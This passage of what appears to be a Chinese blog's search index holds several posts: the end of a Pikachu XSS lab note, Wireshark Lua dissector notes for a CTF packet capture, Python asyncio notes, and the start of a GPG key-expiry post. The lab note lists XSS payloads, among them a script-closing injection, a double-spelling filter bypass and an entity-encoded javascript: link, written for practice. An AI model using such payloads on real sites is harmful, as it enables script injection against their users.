0)&#123;        if($ms == &#x27;tmac&#x27;)&#123;            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)        &#125;else &#123;//            alert($ms);            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)        &#125;    &#125;&lt;/script&gt;\n\nwp给出闭合script的思路可能也是可行的\n&#x27;&lt;/script&gt;&lt;script&gt;alert(1);$aa=&#x27;\n\n无视后面的东西直接闭合跑路似乎也是可行的,但是后面的东西无法闭合就会出现在屏幕上\n&lt;/script&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;\n\n\n双拼写绕过后端处理后对关键词直接进行了删除,可以使用重复的方法写两次来绕过\n&lt;script&gt;alert(1)&lt;/script&gt; -&gt; &lt;&gt;alert(1)&lt;/script&gt;  写成&quot;&gt; &lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt;\n\n\n\nhref标签能自动解unicodejavascript:alert()\n\n&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;\n\n\n\n\n\n试探过滤了什么东西&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;\n\n\n\nhtml实体编码&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;\n\n","categories":["打靶日记","pikachu"],"tags":["xss"]},{"title":"ev3_basic_wireshark解析器","url":"/2025/04/30/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/%E9%9B%B6%E7%A2%8E%E5%8D%95%E9%A2%98/wireshark%E8%A7%A3%E6%9E%90%E5%99%A8/","content":"wireshark解析器问题树\n# 对于乐高编程特有的命令ev3使用了加载器来打开对应的通信包wireshark -X lua_script:ev3_dissector.lua在wireshark中可以看到指令的通信但是导出成json保存却看不到对应的通信## 能否利用这个加载器来对一些数据做一下预处理比如说解http跟踪流的base64## wireshark如何解析http命令### Wireshark如何体现对协议的解析#### wiresharkGUI中什么展现什么不展现##### Wireshark对象导出中的json格式的文件中关于数据包部分什么展现什么不展现### Wireshark -X可以导入自定义解析器，那么对于http是否使用默认的解析器#### Wireshark对于http的解析逻辑是什么样的##### 什么东西是解析出来的 什么东西不是解析出来的原来就是有的### wireshark对于json的导出逻辑是什么#### 这是原来的通信包原本的内容吗##### 通信包在解析前的信息存储形式是什么样的？\n\n\n\nwireshark 加载规则wireshark页面上的数据包有一部分是加载出来的，很多不是原始包内的数据就是这样的，原始包的数据可以通过导出json查看\n对于http协议来说\nget模式的数据包正常来讲就是明文传输的，wireshark数据流能看到的基本在json中也可以看到\n\nPOST协议可能就会出现差异\n这是wireshark中的POST的http数据流的效果\n\n在json中的POST格式是这样的\n&quot;urlencoded-form&quot;: &#123;       &quot;Form item: \\&quot;ReplySuccessPage\\&quot; = \\&quot;advanced.htm\\&quot;&quot;: &#123;         &quot;urlencoded-form.key&quot;: &quot;ReplySuccessPage&quot;,         &quot;urlencoded-form.value&quot;: &quot;advanced.htm&quot;       &#125;,       ······       &quot;Form item: \\&quot;AdminPassword\\&quot; = \\&quot;63c56363c523637c126363ab636bab63c7c76363232363961263c305639a1263c7c76363232363961263c305639a1263c7c76363232363961263c305639a1263\\&quot;&quot;: &#123;         &quot;urlencoded-form.key&quot;: &quot;AdminPassword&quot;,         &quot;urlencoded-form.value&quot;: &quot;63c56363c523637c126363ab636bab63c7c76363232363961263c305639a1263c7c76363232363961263c305639a1263c7c76363232363961263c305639a1263&quot;       &#125;,       &quot;Form item: \\&quot;SessionKey\\&quot; = \\&quot;1735219692\\&quot;&quot;: &#123;         &quot;urlencoded-form.key&quot;: &quot;SessionKey&quot;,         &quot;urlencoded-form.value&quot;: &quot;1735219692&quot;       &#125;,       &quot;Form item: \\&quot;ConfigSystemAdmin\\&quot; = \\&quot;Apply\\&quot;&quot;: &#123;         &quot;urlencoded-form.key&quot;: &quot;ConfigSystemAdmin&quot;,         &quot;urlencoded-form.value&quot;: &quot;Apply&quot;       &#125;     &#125;   &#125;\n\n对于非标准通信协议来说在这个乐高通信协议中倒还是一样\n\nwireshark解析的结果\n\n\njson导出的结果\n\n\n\n似乎目前尚且没有能导出加载器加载后的内容的方法tshark -r ev3_basic.pklg -X lua_script:ev3_dissector.lua -Y &quot;ev3&quot; -T json &gt; T.json\n\n这是最接近可能导出加载完加载器之后以json格式导出文件的命令了，但是即便是这样，这个命令导出的json也仍然没有以明文的形式表示EV3 Message(图片中)那样效果的内容\n\nAI总结\n\n\n在 Wireshark 界面\n在导出的 JSON 文件\n\n\n\n分层显示（Frame &#x2F; Ethernet &#x2F; IP &#x2F; TCP &#x2F; HTTP）\nlayers 字段下有对应协议名\n\n\n每一层字段人类可读、解释得很清楚\n每一层字段作为 JSON 键值出现，原始值保存\n\n\nHTTP报文一行一行展开\nHTTP字段拆成单独的 key:value 保存\n\n\n动态解析部分（比如详细参数解释）只在GUI显示\nJSON只保留基本字段，不会包含详细解析描述\n\n\n蓝牙协议学习\n蓝牙核心技术概述（四）：蓝牙协议规范（HCI、L2CAP、SDP、RFOCMM）-CSDN博客\nHCI、L2CAP、SDP、RFCOMM。对比于英特网五层结构来说：HCI相当于与物理层打交道的协议，L2CAP协议则是链路层相关协议，SDP和RFCOMM则是运输层相关协议，当然其上也有对应的应用层相关的一些协议。SDP用来发现周围蓝牙服务，然后由L2CAP来建立信道链接，然后传输由上层RFCOMM给予的数据分组。\n\nwireshark使用加载器加载器启动分类命令启动dissector伴随加载器启动wireshark\nwireshark -X lua_script:ev3_dissector.lua\n配置默认启动项, 允许wireshark启动的时候自动加载自定义加载器bashCopyEdit~/.config/wireshark/init.lua      # Linux/macOS%APPDATA%\\Wireshark\\init.lua      # Windows\n\n在里面加入：\ndofile(&quot;C:\\\\path\\\\to\\\\your\\\\http_base64_dissector.lua&quot;)\n\n\n\n然后你只需要双击 .pcapng 文件，Wireshark 启动就会自动加载这个 dissector！\n本题中使用了ev3格式的加载器https://github.com/ev3dev/lms-hacker-tools/tree/master/EV3\n\nAny packets to or from TCP port 5555 will be interpreted as “EV3” protocol. USB interrupt data with class IF_CLASS_UNKNOWN will also be interpreted as “EV3” protocol.进出 TCP 端口 5555 的任何数据包都将被解释为“EV3” 协议。类为 IF_CLASS_UNKNOWN 的 USB 中断数据也将被解释为“EV3” 协议。\nYou can also use the filter to search for packets that contain certain types of data. For example if you want to search for all packets that use the LIST_FILES system command, then you would use ev3.sys_cmd == 0x99 for the filter.您还可以使用筛选条件来搜索包含某些类型数据的数据包。例如，如果要搜索使用 LIST_FILES system 命令，则使用 ev3.sys_cmd == 0x99 作为过滤器。\n\n通过以上方式直接定义出一个EV3的类型(对比没加载器之前)\n比如 hitCON CTF&#39;18的EV3-Basic题目,实际上使用的蓝牙通信是直接通过16进制来进行传输直接控制机器,机器硬编码了一个映射表,对于传输进去的十六进制会直接变成机器语言执行,但是对于人来说进行wireshark审计就非常不方便, 所以使用加载器(ev3)进行加载,但是实际上并没有改变原来的十六进制实际上的数据包\n\n加载器内对这些用十六进制传输的数据进行了映射,也就是说在使用这个拓展的wireshark打开这个数据包的时候就直接对着相应的数据进行了编码, 让人可以直观的看到是什么意思\n翻译前如下：\n\n翻译后如下:\n\n通过对比可以清晰的发现这个Dessector的作用主要有两个：\n\n定义什么是ev3协议，并且做出归类标记，方便被过滤\n按照ev3的映射关系进行了翻译\n\n自定义加载器可以解决很多问题 dissector先从简单出发,假设http包只有一个tcp包就完成生成过程这是一个demo，主要的解决问题如下：\n\n能够处理http数据流，处理分片传输的http包（tcp分片）\n\n先使用原生从http_dissector进行解析，然后对解析的结果寻找POST Body在进行base64解码\n以下是拦截监听时候对base64加密http包的处理-- 定义一个新的 Wireshark 协议 dissector，协议名为 &quot;b64http&quot;，显示名为 &quot;HTTP Base64 Inspector&quot;local b64_proto = Proto(&quot;b64http&quot;, &quot;HTTP Base64 Inspector&quot;)-- 定义一个供显示用的字段，用于展示解码后的 Base64 内容local f_decoded = ProtoField.string(&quot;b64http.decoded&quot;, &quot;Decoded Base64 Content&quot;)-- 把字段绑定到协议中b64_proto.fields = &#123; f_decoded &#125;-- 获取已有的 HTTP dissector（内置的 http 协议解析器）local http_dissector = Dissector.get(&quot;http&quot;)-- Base64 解码函数（纯 Lua 实现，无需外部库）local function decode_b64(data)    local b=&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; -- Base64 字符表    data = data:gsub(&#x27;[^&#x27;..b..&#x27;=]&#x27;, &#x27;&#x27;) -- 移除所有非 Base64 合法字符    return (data:gsub(&#x27;.&#x27;, function(x)        if (x == &#x27;=&#x27;) then return &#x27;&#x27; end -- padding 无需转换        local r,f=&#x27;&#x27;,(b:find(x)-1) -- 找到字符对应的索引（0~63）        for i=6,1,-1 do            r=r..(f%2^i - f%2^(i-1) &gt; 0 and &#x27;1&#x27; or &#x27;0&#x27;) -- 转为6位二进制字符串        end        return r    end):gsub(&#x27;%d%d%d?%d?%d?%d?%d?%d?&#x27;, function(x) -- 每8位转换为1个字节        if (#x ~= 8) then return &#x27;&#x27; end        local c=0        for i=1,8 do c=c + (x:sub(i,i)==&#x27;1&#x27; and 2^(8-i) or 0) end        return string.char(c) -- 转成字符    end))end-- 主解析函数（每次抓包调用）function b64_proto.dissector(buffer, pinfo, tree)    pinfo.cols.protocol = &quot;B64HTTP&quot; -- 修改协议列显示名称为 B64HTTP    -- 使用默认 HTTP dissector 先处理 HTTP 协议    http_dissector:call(buffer, pinfo, tree)    -- 如果不是“被访问过”的包（可能是 TCP 片段，还没组装完整），则不处理，避免重复    if not pinfo.visited then return end    -- 将整个 buffer 转为字符串，方便文本匹配    local payload = buffer():string()    -- 从 HTTP 头部提取 Content-Length，用来确认 body 的长度    local content_length = payload:match(&quot;Content%-Length: (%d+)&quot;)    if not content_length then return end    content_length = tonumber(content_length)        -- 找到 HTTP 头部结束位置（\\r\\n\\r\\n）    local header_end = payload:find(&quot;\\r\\n\\r\\n&quot;)    if not header_end then return end    local body_start = header_end + 4 -- body 起始位置    local body_actual_len = #payload - body_start + 1 -- 实际已经收到的 body 长度    -- 如果实际长度不够 Content-Length，说明数据还没收完，需要等待更多 TCP 数据    if body_actual_len &lt; content_length then        pinfo.desegment_len = content_length - body_actual_len -- 告诉 Wireshark 需要继续重组        return    end            -- 提取完整的 body 数据（从 payload 中截取）    local body = payload:sub(body_start, body_start + content_length - 1)    -- 从 JSON 中提取 base64 字符串（假设格式是：&quot;file&quot;: &quot;....&quot;）    local base64_content = body:match(&#x27;&quot;file&quot;%s*:%s*&quot;([^&quot;]+)&quot;&#x27;)    if not base64_content then return end    -- 解码 base64 内容    local decoded = decode_b64(base64_content)    -- 在 Wireshark 界面上添加新的子树显示解析结果    local subtree = tree:add(b64_proto, buffer(), &quot;HTTP Base64 Analysis&quot;)    subtree:add(f_decoded, decoded)end-- 将 dissector 注册到指定 TCP 端口（这里是 8080，表示监听所有 8080 的 TCP 流量）local tcp_port = DissectorTable.get(&quot;tcp.port&quot;)tcp_port:add(8080, b64_proto)\n\n\n\n使用python手动生成一个符合这个加载器加载解析base64的数据包\nfrom scapy.all import *from scapy.layers.inet import IP, TCPfrom scapy.packet import Raw# 构造 HTTP POST 请求内容（包含 Base64 编码字段）http_request = (    &quot;POST /upload HTTP/1.1\\r\\n&quot;    &quot;Host: example.com\\r\\n&quot;    &quot;Content-Type: application/json\\r\\n&quot;    &quot;Content-Length: 28\\r\\n&quot;    &quot;\\r\\n&quot;    &#x27;&#123; &quot;file&quot;: &quot;SGVsbG8gV29ybGQh&quot; &#125;&#x27;)# 构造 TCP/IP 包packet = IP(src=&quot;192.168.0.2&quot;, dst=&quot;192.168.0.1&quot;) / \\         TCP(sport=12345, dport=8080, flags=&quot;PA&quot;, seq=1000, ack=1) / \\         Raw(load=http_request)# 保存为 .pcapng 文件wrpcap(&quot;http_base64_example.pcapng&quot;, [packet])print(&quot;✅ 流量包已保存为 http_base64_example.pcapng&quot;)\n\n使用命令打开加载器\nwireshark -X lua_script:http_base64_dissector.lua\n\n效果展示没有使用加载器\n\n使用加载器之后就出现了新的一行单独展现数据包的内容\n\n实际上http由多个tcp包完成启动命令wireshark -X lua_script:http_base64_split_dissector.lua http_base64_split_example.pcapng\n\n\n\n效果展示对于多个组成的http POST包直接增加一行进行翻译\n\n使用加载器前\n\n生成过程由于 Scapy 构造的两个“孤立包”看起来像是 TCP，但 Wireshark 不能对它们做 TCP 重组，所以 HTTP dissector 不会解析出完整 body，自然也不会 Base64 解码逻辑。\n也就是说这原来的连个tcp包,他们\n\n没有 三次握手（SYN&#x2F;SYN-ACK&#x2F;ACK）\n没有 TCP 连接状态管理\n没有 ACK 回包\nWireshark不会认为这两个包属于同一个 TCP 流，无法做重组！\n\n所以需要使用抓包监听来获取真实的流量数据而不仅仅是模拟\n\n使用flask起一个服务,不可以使用python -m http.server 8080因为只可以接受GET请求,但是问题是现在要的就是POST请求\nfrom flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])def upload():    data = request.get_json()    print(&quot;收到数据：&quot;, data)    return &quot;OK&quot;if __name__ == &#x27;__main__&#x27;:    app.run(port=8080)\n\n\n\n使用curl或者requests进行发包,这里选择的是requests\nimport requestsimport base64data = &#123;    &quot;file&quot;: base64.b64encode(b&quot;Hello World!&quot;).decode()&#125;requests.post(&quot;http://127.0.0.1:8080/upload&quot;, json=data)\n\n使用wireshark监听回环地址\n\n\n直接保存为http_base64_split_example.pcapng\n\n\n构建解析器这种 dissector 不会取代 HTTP 协议本身，但能在 GUI 中添加额外显示内容\n如果加入以下命令可以看到lua console弹出的消息\nfunction b64_post.dissector(buffer, pinfo, tree)    print(&quot;&gt;&gt;&gt; Base64 dissector called on frame:&quot;, pinfo.number)\n\n\n\n\n-- 定义一个新的后解析器（post-dissector）协议，名称为 &quot;b64post&quot;，描述为 &quot;Base64 Post Dissector&quot;local b64_post = Proto(&quot;b64post&quot;, &quot;Base64 Post Dissector&quot;)-- 定义一个字段，用于展示解码后的 Base64 内容，字段名为 &quot;b64post.decoded&quot;，显示名为 &quot;Decoded Base64 Content&quot;local f_decoded = ProtoField.string(&quot;b64post.decoded&quot;, &quot;Decoded Base64 Content&quot;)-- 将定义好的字段添加到协议中b64_post.fields = &#123; f_decoded &#125;-- 从 JSON 协议解析结果中提取名为 &quot;value.string&quot; 的字段（Wireshark 的 json dissector 生成的字段）local json_value = Field.new(&quot;json.value.string&quot;)-- 定义一个函数：手动实现 Base64 解码（不依赖外部库）local function decode_b64(data)    -- Base64 编码表    local b=&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;    -- 去掉所有非法字符（非 base64 字符）    data = data:gsub(&#x27;[^&#x27;..b..&#x27;=]&#x27;, &#x27;&#x27;)    -- 将每个 base64 字符转换为对应的6位二进制，并拼接所有位    return (data:gsub(&#x27;.&#x27;, function(x)        if (x == &#x27;=&#x27;) then return &#x27;&#x27; end -- padding 不转换        local r,f=&#x27;&#x27;,(b:find(x)-1) -- 找到字符索引（从0开始）        for i=6,1,-1 do             r=r..(f%2^i - f%2^(i-1) &gt; 0 and &#x27;1&#x27; or &#x27;0&#x27;)         end        return r    -- 每8位一组还原为原始字符    end):gsub(&#x27;%d%d%d?%d?%d?%d?%d?%d?&#x27;, function(x)        if (#x ~= 8) then return &#x27;&#x27; end -- 位数不足8位，忽略        local c=0        for i=1,8 do             c=c + (x:sub(i,i)==&#x27;1&#x27; and 2^(8-i) or 0)         end        return string.char(c) -- 转换为字符    end))end-- 定义解析器的主函数，每次数据包载入后调用function b64_post.dissector(buffer, pinfo, tree)    -- 获取 JSON 协议中的 value.string 字段    local value_field = json_value()    if not value_field then return end -- 若无该字段，则跳过处理    -- 转换字段为字符串（base64 字符串）    local base64 = tostring(value_field)    -- 可选：判断字符串是否为合法的 base64 字符串（避免误解析）    if not base64:match(&quot;^[A-Za-z0-9+/=]+$&quot;) then return end    -- 调用 decode_b64 解码    local decoded = decode_b64(base64)    if decoded then        -- 创建一个子树节点，显示解析内容        local subtree = tree:add(b64_post, &quot;Base64 JSON Analysis&quot;)        subtree:add(f_decoded, decoded) -- 添加解码后的字段到子树中    endend-- 注册该协议为 Wireshark 的后解析器（即所有协议分析完后，再调用这个）register_postdissector(b64_post)\n\n\n\n这是专门针对json做的优化,由于base64数据是包含在json中发送的,所以需要去解析这个json获取base64编码的密文来进行解码\nlocal json_value = Field.new(&quot;json.value.string&quot;)\n\n\n\n增强版解析器为了支持多层嵌套和多个字段的 Base64 解码，可以将原脚本扩展为以下功能：\n\n遍历所有 json.value.string 字段；\n对每个字段尝试 base64 解码；\n显示每一个成功解码的内容；\n同样使用当前的 base64 解码函数。\n\n下面是改进后的完整脚本：\n-- 定义协议和字段local b64_post = Proto(&quot;b64post&quot;, &quot;Base64 Post Dissector&quot;)local f_decoded = ProtoField.string(&quot;b64post.decoded&quot;, &quot;Decoded Base64 Content&quot;)b64_post.fields = &#123; f_decoded &#125;-- 引用所有 json.value.string 字段（可能有多个）local json_values = &#123; Field.new(&quot;json.value.string&quot;) &#125;-- Base64 解码函数local function decode_b64(data)    local b = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;    data = data:gsub(&#x27;[^&#x27;..b..&#x27;=]&#x27;, &#x27;&#x27;) -- 过滤非法字符    return (data:gsub(&#x27;.&#x27;, function(x)        if x == &#x27;=&#x27; then return &#x27;&#x27; end        local r, f = &#x27;&#x27;, (b:find(x) - 1)        for i = 6, 1, -1 do            r = r .. (f % 2^i - f % 2^(i-1) &gt; 0 and &#x27;1&#x27; or &#x27;0&#x27;)        end        return r    end):gsub(&#x27;%d%d%d?%d?%d?%d?%d?%d?&#x27;, function(x)        if #x ~= 8 then return &#x27;&#x27; end        local c = 0        for i = 1, 8 do            c = c + (x:sub(i, i) == &#x27;1&#x27; and 2^(8 - i) or 0)        end        return string.char(c)    end))end-- 主解析函数function b64_post.dissector(buffer, pinfo, tree)    local has_output = false    local subtree = nil    -- 遍历所有匹配字段    for _, getter in ipairs(json_values) do        local field = getter()        if field then            local base64 = tostring(field)            -- 检查是否可能是 base64 编码            if base64:match(&quot;^[A-Za-z0-9+/=]+$&quot;) then                local decoded = decode_b64(base64)                if decoded and decoded:match(&quot;%C&quot;) then  -- %C: 非空白字符                    if not subtree then                        subtree = tree:add(b64_post, &quot;Base64 JSON Analysis&quot;)                    end                    subtree:add(f_decoded, decoded)                    has_output = true                end            end        end    endend-- 注册为后解析器register_postdissector(b64_post)\n\n\n\n加载器无法运用在http跟踪流的窗口!Wireshark 中的“跟踪流（Follow Stream）”功能是原始 TCP 字节流的重建视图，它展示的是通信双方“看到”的原始数据，不经过 dissector 插件处理（也就是说，不调用 dissector() 函数）。这是设计上的决策，目的是让用户看到协议最原始的内容（用于取证、协议逆向等）\nwireshark各类端口过滤命令tcp.dstport == 1234 过滤目标端口tcp.srcport == 1234 过滤源端口port == 1234 过滤端口dst port == 1234 同上\n\n数据包标号：Frame Number\n","categories":["打靶日记","零碎单题"],"tags":["wireshark"]},{"title":"python_异步编程笔记","url":"/2025/05/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/","content":"异步编程\n参考视频: https://www.bilibili.com/video/BV157mFYEEkHpython官方文档: https://docs.python.org/3.12/library/asyncio-task.html  \n\n前提\n执行协程函数，必须使用事件循环  \n如果没有创建asyncio任务也可以执行协程函数,但是不是并发运行,通过await激发,但是这样的操作没有并发  \n协程中提到的loop是指任务循环  \n在任务循环中,实际上是依次执行各个任务,由于存在的GIL,python实际上不存在真正的多核并发,只是疯狂转换, 那么如果没有碰到await标记的可挂起步骤, 是会一直在CPU上机处理, 从而阻塞整个任务循环, 之所以print这样的步骤不需要await,是因为这样的操作速度足够快,不会阻塞整个任务循环,所以不需要挂起\n\n意义\n避免耗时IO阻塞耗费时间,可以同时执行多个任务,提升性能\n\n协程的特点是可以暂停运行也可以继续运行当出现关键词await的时候就会让出控制权,暂停运行,直到后面东西完成了才回来执行后面的内容\n将协程包装成任务函数前面加上async,需要暂停的地方进行改写,例如\nsleep(1)  --&gt; await asyncio.sleep(1)\nawait的第二个作用就是将后面的协程包装成任务,让事件循环调度定义完协程函数就要定义协程并且包装为任务在main函数汇总调用协程函数得到协程,并且包装为任务  \ntask1 =  async.create_task(coro(url))\n然后使用await来获取结果(需要注意的是,这里的await必须在协程函数中,不能在main函数中),也就是说:✅ async def main():pass❌ def main():pass\nresult = await task1\n\n建立事件循环asyncio.create_task() 函数，用于将协程作为 asyncio 任务并发运行。需要注意的是,如果没有创建asyncio任务也可以执行,但是不是并发运行  \nasyncio.run(main())\n\nawait表明当前的协程要暂停运行,当协程中的await被执行时,事件循环会暂停当前协程,并开始执行下一个协程,当执行完毕时,事件循环会恢复当前协程继续执行如果await后面是一个协程,就将协程包装为一个任务,但是如果已经是一个任务了,就将任务加入到事件循环中,等待执行,等到任务执行完毕,await会获取这个协程执行的结果result = await task1,所以result会接受这个结果  \n建立的分类:手动和自动手动:手动创建然后触发,获取结果,优点是可以控制,缺点是麻烦,需要自己管理  \ntask1 =  async.create_task(coro(url))result = await task1\n\n参考代码:  \nasync def main():    url = &#x27;http://httpbin.org&#x27;    file_path = &#x27;file.txt&#x27;    task1 = asyncio.create_task(fetch_url(url))    task2 = asyncio.create_task(read_file(file_path))    fetch_result = await task1    fetch_file = await task2        if __name__ == &#x27;__main__&#x27;:    start_time = time.time()    asyncio.run(main()) # 手动运行        end_time = time.time()    print(&quot;the time cost is &quot;, end_time - start_time)\n\n自动:有两个方法:asyncio.gather()和asyncio.as_completed()\n\nasyncio.gather() 等待所有任务完成返回 可以传入多个任务,并且等待所有任务执行完毕,然后返回一个列表(按照传入顺序给结果)\n import asyncio    results = await asyncio.gather(fun1(),fun2())\n\n 实例代码:  \n async def main():    url = &#x27;http://httpbin.org&#x27;    file_path = &#x27;file.txt&#x27;    results = await asyncio.gather(read_file(file_path), fetch_url(url))    print(results)if __name__ == &#x27;__main__&#x27;:    start_time = time.time()    asyncio.run(main()) # 手动运行    end_time = time.time()    print(&quot;the time cost is &quot;, end_time - start_time)\n\nasyncio.as_completed()不会等待所有任务完成,而是返回一个迭代器,迭代器中包含的是任务, 当任务完成时,迭代器会返回这个任务,并且可以获取这个任务的结果,但是不能保证顺序 也就是说谁先完成谁先执行接下来的逻辑 需要注意的是,这个方法传入的是一个列表\n results = asyncio.as_completed([fun1(),fun2()])for result in results:     print(await result)\n\n 示例代码:\n async def main():    url = &#x27;http://httpbin.org&#x27;    file_path = &#x27;file.txt&#x27;    results = asyncio.as_completed([ read_file(file_path),fetch_url(url)])    for result in results:        print(await result) # 返回的是一个对象!    print(results)if __name__ == &#x27;__main__&#x27;:    start_time = time.time()    asyncio.run(main()) # 手动运行    end_time = time.time()    print(&quot;the time cost is &quot;, end_time - start_time)\n\n异步http请求AI实例源码:\naiohttp.ClientSession()内部维护了一个tcp连接池,可以使用tcp复用\n也可以手动管理,但是如果忘记session.close()就有可能导致连接泄露,并且代码冗余\nsession = aiohttp.ClientSession()  # 手动创建会话try:    response = await session.get(&quot;https://example.com&quot;)    data = await response.text()finally:    await session.close()  # 必须手动关闭！\n\n\n\nimport asyncioimport requests  # ❌ 同步库import aiohttp   # ✅ 异步库async def bad_coroutine():    print(&quot;Start sync request&quot;)    requests.get(&quot;https://httpbin.org/delay/2&quot;)  # ❌ 阻塞 2 秒    print(&quot;Sync request done&quot;)async def good_coroutine():    print(&quot;Start async request&quot;)    async with aiohttp.ClientSession() as session:        await session.get(&quot;https://httpbin.org/delay/2&quot;)  # ✅ 非阻塞    print(&quot;Async request done&quot;)async def main():    await asyncio.gather(bad_coroutine(), good_coroutine())asyncio.run(main())\n\n\n\n多线程实现异步asyncio.to_thread()与多线程对比需要注意的是,这个并不是真正意义上的多线程, 实际上仍是单核,处理CPU-bound的时候会相当吃力,如果是 CPU 密集型任务 → 用多进程（multiprocessing）绕过 GIL。\n协程是单线程的\nasyncio 的协程运行在 单个线程 中，由 事件循环（loop） 调度。\n并发原理：通过 await 挂起 I&#x2F;O 等待，让事件循环切换到其他任务，实现 协作式并发。模拟CPU并发,耗时就下CPU一边凉快去,需要计算就上CPU计算\n优势：\n比多线程 更轻量（无线程切换开销）。\n适合 高并发 I&#x2F;O 操作（如网络请求、文件读写）。\n\n\n\n对比多线程\n\n\n\nasyncio（协程）\n多线程\n\n\n\n并发模型\n单线程 + 事件循环\n多线程 + OS 调度\n\n\n适用场景\nI&#x2F;O 密集型（如 HTTP 请求）\nCPU 密集型 或 混合型任务\n\n\n性能开销\n极低（无线程切换）\n高（线程切换、锁竞争）\n\n\nGIL 影响\n无影响（单线程）\n受 GIL 限制（CPU 任务无法并行）\n\n\n设计目标不同\n\n\nasyncio.to_thread()\n多线程（threading）\n\n\n\n主要用于 在协程中运行同步阻塞代码（如 time.sleep()、requests.get()），避免阻塞事件循环。\n用于 真正的并行执行（受 GIL 限制，适合 I&#x2F;O 密集型任务）。\n\n\n底层仍然依赖线程池，但 由 asyncio 管理，对开发者透明。\n开发者需要手动管理线程的生命周期、同步机制（如 Lock、Queue）。\n\n\n适用于 async/await 代码，与协程无缝集成。\n适用于同步代码，与 asyncio 不直接兼容。\n\n\n执行方式不同asyncio.to_thread()\n运行方式：\n\n将同步函数 提交到线程池（默认使用 concurrent.futures.ThreadPoolExecutor）。\n线程池执行完成后，结果返回给事件循环，协程继续执行。\n\nimport asyncioimport timedef blocking_task():    time.sleep(2)  # 同步阻塞操作    return &quot;Done&quot;async def main():    result = await asyncio.to_thread(blocking_task)  # 在子线程中运行    print(result)  # 输出 &quot;Done&quot;asyncio.run(main())\n\n\n\n特点：\n\n不会阻塞事件循环（因为 time.sleep(2) 在子线程中运行）。\n适合偶尔的同步阻塞调用（如数据库查询、文件读写）。\n\n\n\n多线程（threading）\n运行方式：\n\n直接创建和管理线程，每个线程独立执行任务。\n需要手动处理线程同步（如 Lock、Event）。\n\n\n示例：\nimport threadingimport timedef blocking_task():    time.sleep(2)    print(&quot;Done&quot;)thread = threading.Thread(target=blocking_task)thread.start()  # 启动线程thread.join()   # 等待线程结束\n\n特点：\n\n真正的并行执行（受 GIL 限制，I&#x2F;O 密集型任务可以并发）。\n适合长期运行的并发任务（如 Web 服务器处理多个请求）。\n\n\n\n性能对比\n\n\n场景\nasyncio.to_thread()\n多线程（threading）\n\n\n\nI&#x2F;O 密集型任务（如 HTTP 请求）\n✅ 高效（协程 + 线程池结合）\n✅ 高效（线程可以并发等待 I&#x2F;O）\n\n\nCPU 密集型任务（如计算）\n❌ 受 GIL 限制（仍然单核）\n⚠️ 受 GIL 限制（多线程无法真正并行计算）\n\n\n适用场景\n适合 asyncio 代码中 偶尔的同步阻塞调用\n适合 纯同步代码的并发执行\n\n\n适用场景asyncio.to_thread() 更适合：\n在 async/await 代码中 临时调用同步阻塞函数（如 requests.get()、time.sleep()）。\n\n希望 保持 asyncio 的简洁性，避免手动管理线程。\n\n示例：\nasync def fetch_data():    data = await asyncio.to_thread(requests.get, &quot;https://example.com&quot;)  # 不阻塞事件循环    return data.json()\n\n多线程（threading）更适合：\n纯同步代码，需要并发执行多个任务。\n\n长期运行的并发任务（如 Web 服务器、爬虫）。\n\n示例：\ndef worker():    while True:        task = queue.get()  # 从队列取任务        process(task)       # 处理任务        queue.task_done()   # 标记完成# 启动 4 个线程for _ in range(4):    threading.Thread(target=worker, daemon=True).start()\n\n\n5. 关键总结\n\n\n对比维度\nasyncio.to_thread()\n多线程（threading）\n\n\n\n设计目标\n在协程中运行同步阻塞代码\n实现真正的并发（受 GIL 限制）\n\n\n阻塞问题\n不会阻塞事件循环\n可能阻塞主线程（需手动管理）\n\n\n适用场景\nasync/await 代码中的临时同步调用\n纯同步代码的并发执行\n\n\n性能\n适合少量阻塞调用\n适合高并发 I&#x2F;O 任务\n\n\n复杂度\n简单（自动管理线程池）\n较高（需处理线程同步）\n\n\n选择建议\n如果已经在用 asyncio → 优先用 asyncio.to_thread() 处理同步阻塞代码。\n如果是纯同步代码 → 用多线程（threading）或 concurrent.futures。\n如果是 CPU 密集型任务 → 用多进程（multiprocessing）绕过 GIL。\n\n\n最终结论\nasyncio.to_thread() 是 协程与线程的桥梁，让 async/await 代码能兼容同步阻塞操作。\n多线程 仍然是 传统并发编程 的主要方式，适合非 asyncio 场景。\n最佳实践：在 asyncio 生态中尽量用异步库（如 aiohttp），只有必要时才用 to_thread。\n\n协程的其他操作\nasyncio.to_thread(fun(1),1,2,3)这个方法是将一个非协程函数转换成协程函数,并且传入参数,并且返回一个协程对象,这个对象可以await  \n\n\n","categories":["代码审计","python"],"tags":["python"]},{"title":"GPG密钥过期","url":"/2025/04/23/%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/GPG%E5%AF%86%E9%92%A5%E5%AF%86%E9%92%A5%E8%BF%87%E6%9C%9F/","content":"GPG 密钥过期起源使用apt install的时候发现镜像部分出现报错\nErr:3 https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling InRelease  The following signatures were invalid: EXPKEYSIG 